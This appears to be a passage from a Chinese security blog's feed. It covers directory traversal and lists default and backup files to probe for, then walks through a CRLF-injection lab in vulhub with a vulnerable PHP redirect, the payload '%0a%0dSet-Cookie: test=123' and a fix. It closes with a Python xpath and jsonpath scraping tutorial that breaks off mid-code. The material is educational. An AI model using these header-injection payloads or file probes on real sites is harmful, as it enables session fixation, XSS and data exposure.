目录穿越</p><p>&lt;1&gt; 漏洞原理：目录穿越漏洞原理比较简单，程序在实现上没有充分过滤用户输入的 <code>../</code> 之类的目录跳转符，导致恶意用户可以访问web根目录的上级从而遍历服务器上的任意文件。虽然 web 服务器本身会禁止访问 web 文件夹以外的地方，但如果是智障开发引入的动态页面，又没有过滤好用户输入，就可能会出现穿越甚至目录遍历。甚至 web 服务器本身也曾经有类似的漏洞，比如 Apache Tomcat 的 UTF-8 解析漏洞，具体利用和绕过可以参考其他网上的文章，这里限于篇幅就不展开了。<br>&lt;2&gt; 文章地址：<a href="https://zhuanlan.zhihu.com/p/21516413">https://zhuanlan.zhihu.com/p/21516413</a></p><p>（2）Nginx配置安全</p><p>&lt;1&gt; 漏洞原理：Nginx 的配置选项之多，并不是所有人都能熟悉，但不表示随便百度一下复制粘贴就配置了，最好还是先看下官方文档对应选项的作用和用法，可以避免许多致命的错误。例如 Nginx 在代理静态文件时，如果不小心在配置文件中写错了一个字符：location &#x2F;static {alias  &#x2F;home&#x2F;web&#x2F;static&#x2F;;}，就会导致访问 <code>http://example.com/static../</code> 时可以访问上级目录，从而访问到敏感的信息。关于 nginx 配置安全，离别歌的这篇文章其实写得很不错，值得每个开发和运维人员仔细了解。<br>&lt;2&gt; 文章地址：<a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html">https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html</a></p><br><h2 id="四、默认文件泄露"><a href="#四、默认文件泄露" class="headerlink" title="四、默认文件泄露"></a>四、默认文件泄露</h2><h3 id="1、常见的默认文件泄露"><a href="#1、常见的默认文件泄露" class="headerlink" title="1、常见的默认文件泄露"></a>1、常见的默认文件泄露</h3><p>一些集成的搭建环境会存在有一些默认文件，像 XAMPP、PHPStudy等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">robots.txt</span><br><span class="line">README.md</span><br><span class="line">phpinfo.php</span><br></pre></td></tr></table></figure><h3 id="2、数据库文件泄露"><a href="#2、数据库文件泄露" class="headerlink" title="2、数据库文件泄露"></a>2、数据库文件泄露</h3><p>（1）数据备份文件</p><p>数据库文件是以 <code>.sql</code> 结尾，所以可以试一下网站有没有数据库文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backup.sql</span><br></pre></td></tr></table></figure><p>（2）数据库文件</p><p>mdb文件是早期asp+access构架的数据库文件。一般在目录 &#x2F;db&#x2F; 下有一个 mdb 文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/db/db.mdb</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;信息泄露&lt;/p&gt;</summary>
    
    
    
    <category term="Web漏洞" scheme="http://blog.hvvl404.fun/categories/Web%E6%BC%8F%E6%B4%9E/"/>
    
    
  </entry>
  
  <entry>
    <title>CRLF注入</title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/CRLF%E6%B3%A8%E5%85%A5/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/CRLF%E6%B3%A8%E5%85%A5/</id>
    <published>2023-05-12T14:23:23.978Z</published>
    <updated>2023-05-18T14:20:38.460Z</updated>
    
    <content type="html"><![CDATA[<p>CRLF 注入</p><span id="more"></span><h2 id="一、什么是-CRLF？"><a href="#一、什么是-CRLF？" class="headerlink" title="一、什么是 CRLF？"></a>一、什么是 CRLF？</h2><p>CRLF 指的是回车符(CR，ASCII 13，\r，%0d) 和换行符(LF，ASCII 10，\n，%0a)，操作系统就是根据这个标识来进行换行的，你在键盘输入回车键就是输出这个字符，只不过win和linux系统采用的标识不一样而已。</p><p>在 HTTP 当中 HTTP 的 Header 和 Body 之间就是用两个 crlf 进行分隔的，如果能控制 HTTP 消息头中的字符，注入一些恶意的换行，这样就能注入一些会话cookie和html代码，所以CRLF injection 又叫做 HTTP response Splitting，简称 HRS。CRLF 漏洞可以造成 <strong>Cookie会话固定</strong> 和 <strong>反射型XSS(可过waf)</strong> 的危害，注入XSS的利用方式：<strong>连续使用两次%0d%oa就会造成header和body之间的分离，就可以在其中插入xss代码形成反射型xss漏洞。</strong></p><br><h2 id="二、原理分析"><a href="#二、原理分析" class="headerlink" title="二、原理分析"></a>二、原理分析</h2><p>HRS漏洞存在的前提是 ：url 当中输入的字符会影响到文件，比如在重定位当中可以尝试使用 <code>%0d%0a</code> 作为 CRLF。</p><p>一般网站会在HTTP头中加上 <code>Location: http://baidu.com</code> 的方式来进行 302 跳转，所以我们能控制的内容就是 Location: 后面的XXX网址，对这个地址进行污染。</p><p>假设服务端（PHP）的处理方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>(<span class="string">&quot;security_level&quot;</span>) == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span>. <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码意思是说当条件满足时，将请求包中的url参数值拼接到Location字符串中，并设置成响应头发送给客户端。</p><p>此时服务器端接收到的url参数值是我们修改后的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://baidu.com/xxx%0a%0dSet-Cookie: test=123</span><br></pre></td></tr></table></figure><p>在url参数值拼接到Location字符串中，设置成响应头后，响应头就会看到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: test=123</span><br></pre></td></tr></table></figure><br><h2 id="三、本地测试"><a href="#三、本地测试" class="headerlink" title="三、本地测试"></a>三、本地测试</h2><p>在 Ubuntu 上利用 docker 搭建 vulhub 靶场，进入 <code>/vulhub/nginx/insecure-configuration</code> （docker 的安装方法这里就不赘述），8080 端口是 CRLF 注入的靶场。</p><p>启动容器 docker：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/CRLF-2.png" alt="CRLF-2"></p><p>构造 payload ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%0a%0dSet-Cookie: test=123</span><br></pre></td></tr></table></figure><p>查看响应头，发现有个字段是 <code>Set-Cookie: test=123</code>，说明响应头文件的信息被我们修改了。</p><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/CRLF-1.png" alt="CRLF-1"></p><br><h2 id="四、修复方法"><a href="#四、修复方法" class="headerlink" title="四、修复方法"></a>四、修复方法</h2><p>服务端收到前端过来的参数，在加入Location之前，需要过滤 \r 、\n 之类的行结束符，避免输入的数据污染其它HTTP首部字段。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CRLF 注入&lt;/p&gt;</summary>
    
    
    
    <category term="Web漏洞" scheme="http://blog.hvvl404.fun/categories/Web%E6%BC%8F%E6%B4%9E/"/>
    
    
  </entry>
  
  <entry>
    <title>Python爬虫-解析</title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Python/14_Python%E7%88%AC%E8%99%AB_%E8%A7%A3%E6%9E%90/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Python/14_Python%E7%88%AC%E8%99%AB_%E8%A7%A3%E6%9E%90/</id>
    <published>2023-05-12T13:03:55.780Z</published>
    <updated>2023-05-12T13:11:37.281Z</updated>
    
    <content type="html"><![CDATA[<p>解析</p><span id="more"></span><h4 id="一、xpath"><a href="#一、xpath" class="headerlink" title="一、xpath"></a>一、xpath</h4><h5 id="1、xpath的基本使用"><a href="#1、xpath的基本使用" class="headerlink" title="1、xpath的基本使用"></a>1、xpath的基本使用</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;l1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;a1&quot;</span>&gt;</span>厦门<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;l2&quot;</span>&gt;</span>福州<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;l3&quot;</span>&gt;</span>泉州<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;c1&quot;</span>&gt;</span>漳州<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;c2&quot;</span>&gt;</span>南平<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;c3&quot;</span>&gt;</span>龙岩<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">tree = etree.parse(<span class="string">&#x27;01_解析_xpath的基本使用.html&#x27;</span>)</span><br><span class="line">li_list = tree.xpath(<span class="string">&#x27;//ul/li/text()&#x27;</span>)</span><br><span class="line"><span class="comment"># [&#x27;厦门&#x27;, &#x27;福州&#x27;, &#x27;泉州&#x27;, &#x27;漳州&#x27;, &#x27;南平&#x27;, &#x27;龙岩&#x27;]</span></span><br><span class="line"><span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># li_list = tree.xpath(&#x27;//ul/li[@id=&quot;l1&quot;]/text()&#x27;)</span></span><br><span class="line"><span class="comment"># # [&#x27;厦门&#x27;]</span></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># li_list = tree.xpath(&#x27;//ul/li[@id=&quot;l1&quot;]/@class&#x27;)</span></span><br><span class="line"><span class="comment"># [&#x27;a1&#x27;]</span></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询包含 “字符串” 的数据</span></span><br><span class="line"><span class="comment"># li_list = tree.xpath(&#x27;//ul/li[contains(@id,&quot;l&quot;)]/text()&#x27;)</span></span><br><span class="line"><span class="comment"># [&#x27;厦门&#x27;, &#x27;福州&#x27;, &#x27;泉州&#x27;]</span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询以 “字符串” 开头的数据</span></span><br><span class="line"><span class="comment"># li_list = tree.xpath(&#x27;//ul/li[starts-with(@id,&quot;c&quot;)]/text()&#x27;)</span></span><br><span class="line"><span class="comment"># [&#x27;漳州&#x27;, &#x27;南平&#x27;, &#x27;龙岩&#x27;]</span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 与语句 查询id为l1 和 class为a1的数据</span></span><br><span class="line"><span class="comment"># li_list = tree.xpath(&#x27;//ul/li[@id=&quot;l1&quot; and @class=&quot;a1&quot;]/text()&#x27;)</span></span><br><span class="line"><span class="comment"># [&#x27;厦门&#x27;]</span></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或语句 查询id为l1 和 id为l2的数据</span></span><br><span class="line"><span class="comment"># li_list = tree.xpath(&#x27;//ul/li[@id=&quot;l1&quot;]/text() | //ul/li[@id=&quot;l2&quot;]/text()&#x27;)</span></span><br><span class="line"><span class="comment"># [&#x27;厦门&#x27;, &#x27;福州&#x27;]</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(li_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(li_list))</span><br></pre></td></tr></table></figure><h5 id="2、xpath-获取百度-百度一下"><a href="#2、xpath-获取百度-百度一下" class="headerlink" title="2、xpath 获取百度-百度一下"></a>2、xpath 获取百度-百度一下</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://www.baidu.com/&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">request = urllib.request.Request(url = url,headers = headers)</span><br><span class="line"></span><br><span class="line">response = urllib.request.urlopen(request)</span><br><span class="line"></span><br><span class="line">content = response.read().decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">tree = etree.HTML(content)</span><br><span class="line"></span><br><span class="line">result = tree.xpath(<span class="string">&#x27;//input[@type=&quot;submit&quot;]/@value&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h5 id="3、xpath-站长素材"><a href="#3、xpath-站长素材" class="headerlink" title="3、xpath 站长素材"></a>3、xpath 站长素材</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> jsonpath</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_request</span>(<span class="params">page</span>):</span><br><span class="line">    <span class="keyword">if</span>(page == <span class="number">1</span>):</span><br><span class="line">        url = <span class="string">&#x27;https://sc.chinaz.com/tupian/QiCheTuPian.html&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url = <span class="string">&#x27;https://sc.chinaz.com/tupian/QiCheTuPian_&#x27;</span> + <span class="built_in">str</span>(page) + <span class="string">&#x27;.html&#x27;</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    request = urllib.request.Request(url = url,headers = headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> request</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_content</span>(<span class="params">request</span>):</span><br><span class="line">    response = urllib.request.urlopen(request)</span><br><span class="line"></span><br><span class="line">    content = response.read().decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">down_loads</span>(<span class="params">content</span>):</span><br><span class="line">    tree = etree.HTML(content)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 注意：xpath方法返回的值是列表类型</span></span><br><span class="line">    name_list = tree.xpath(<span class="string">&#x27;//div[@class=&quot;container&quot;]//img/@alt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    src_list = tree.xpath(<span class="string">&#x27;//div[@class=&quot;container&quot;]//img/@data-original&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">        name = name_list[i]</span><br><span class="line">        src = src_list[i]</span><br><span class="line">        url =<span class="string">&#x27;https:&#x27;</span> + src</span><br><span class="line">        <span class="built_in">print</span>(name,src)</span><br><span class="line">        result = urllib.request.urlretrieve(url = url,filename =<span class="string">&#x27;./QiCheImage/&#x27;</span> + name + <span class="string">&#x27;.jpg&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start_page = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入起始页码：&#x27;</span>))</span><br><span class="line">    end_page = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入结束页码：&#x27;</span>))</span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(start_page,end_page+<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># （1）请求对象的定制</span></span><br><span class="line">        request = create_request(page)</span><br><span class="line">        <span class="comment"># （2）获取请求的数据</span></span><br><span class="line">        content = get_content(request)</span><br><span class="line">        <span class="comment"># （3）下载数据</span></span><br><span class="line">        down_loads(content)</span><br></pre></td></tr></table></figure><br><h4 id="二、jsonpath"><a href="#二、jsonpath" class="headerlink" title="二、jsonpath"></a>二、jsonpath</h4><h5 id="1、jsonpath-的基本使用"><a href="#1、jsonpath-的基本使用" class="headerlink" title="1、jsonpath 的基本使用"></a>1、jsonpath 的基本使用</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;store&quot;: &#123;</span><br><span class="line">    &quot;book&quot;: [</span><br><span class="line">      &#123; &quot;category&quot;: &quot;reference&quot;,</span><br><span class="line">        &quot;author&quot;: &quot;Nigel Rees&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;Sayings of the Century&quot;,</span><br><span class="line">        &quot;price&quot;: 8.95</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123; &quot;category&quot;: &quot;fiction&quot;,</span><br><span class="line">        &quot;author&quot;: &quot;Evelyn Waugh&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;Sword of Honour&quot;,</span><br><span class="line">        &quot;price&quot;: 12.99</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123; &quot;category&quot;: &quot;fiction&quot;,</span><br><span class="line">        &quot;author&quot;: &quot;Herman Melville&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;Moby Dick&quot;,</span><br><span class="line">        &quot;isbn&quot;: &quot;0-553-21311-3&quot;,</span><br><span class="line">        &quot;price&quot;: 8.99</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123; &quot;category&quot;: &quot;fiction&quot;,</span><br><span class="line">        &quot;author&quot;: &quot;J. R. R. Tolkien&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;The Lord of the Rings&quot;,</span><br><span class="line">        &quot;isbn&quot;: &quot;0-395-19395-8&quot;,</span><br><span class="line">        &quot;price&quot;: 22.99</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;bicycle&quot;: &#123;</span><br><span class="line">      &quot;color&quot;: &quot;red&quot;,</span><br><span class="line">      &quot;price&quot;: 19.95</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> jsonpath</span><br><span class="line"></span><br><span class="line">obj = json.load(<span class="built_in">open</span>(<span class="string">&#x27;04_解析_jsonpath之基本使用.json&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 书的所有作者</span></span><br><span class="line"><span class="comment"># author_list = jsonpath.jsonpath(obj,&#x27;$.store.book[*].author&#x27;)</span></span><br><span class="line"><span class="comment"># print(author_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有作者（除了书之外的作者）</span></span><br><span class="line"><span class="comment"># author_list = jsonpath.jsonpath(obj,&#x27;$..author&#x27;)</span></span><br><span class="line"><span class="comment"># print(author_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 商店以下的信息</span></span><br><span class="line"><span class="comment"># tag_list = jsonpath.jsonpath(obj,&#x27;$.store.*&#x27;)</span></span><br><span class="line"><span class="comment"># print(tag_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 商店下面的price信息</span></span><br><span class="line"><span class="comment"># book_list = jsonpath.jsonpath(obj,&#x27;$.store..price&#x27;)</span></span><br><span class="line"><span class="comment"># print(book_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三本书</span></span><br><span class="line"><span class="comment"># book_list = jsonpath.jsonpath(obj,&#x27;$..book[2]&#x27;)</span></span><br><span class="line"><span class="comment"># print(book_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后一本书</span></span><br><span class="line"><span class="comment"># book_list = jsonpath.jsonpath(obj,&#x27;$..book[(@.length-1)]&#x27;)</span></span><br><span class="line"><span class="comment"># print(book_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 前两本书</span></span><br><span class="line"><span class="comment"># (1) book_list = jsonpath.jsonpath(obj,&#x27;$..book[0,1]&#x27;)</span></span><br><span class="line"><span class="comment"># (2) book_list = jsonpath.jsonpath(obj,&#x27;$..book[:2]&#x27;)</span></span><br><span class="line"><span class="comment"># print(book_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 含有 isbn 的书 条件判断要用? 在()前加?</span></span><br><span class="line"><span class="comment"># book_list = jsonpath.jsonpath(obj,&#x27;$..book[?(@.isbn)]&#x27;)</span></span><br><span class="line"><span class="comment"># print(book_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># price 大于10 的书</span></span><br><span class="line"><span class="comment"># book_list = jsonpath.jsonpath(obj,&#x27;$..book[?(@.price&gt;10)]&#x27;)</span></span><br><span class="line"><span class="comment"># print(book_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示全部信息</span></span><br><span class="line">book_list = jsonpath.jsonpath(obj,<span class="string">&#x27;$..*&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(book_list)</span><br></pre></td></tr></table></figure><h5 id="2、jsonpath-淘票票"><a href="#2、jsonpath-淘票票" class="headerlink" title="2、jsonpath 淘票票"></a>2、jsonpath 淘票票</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">url = <span 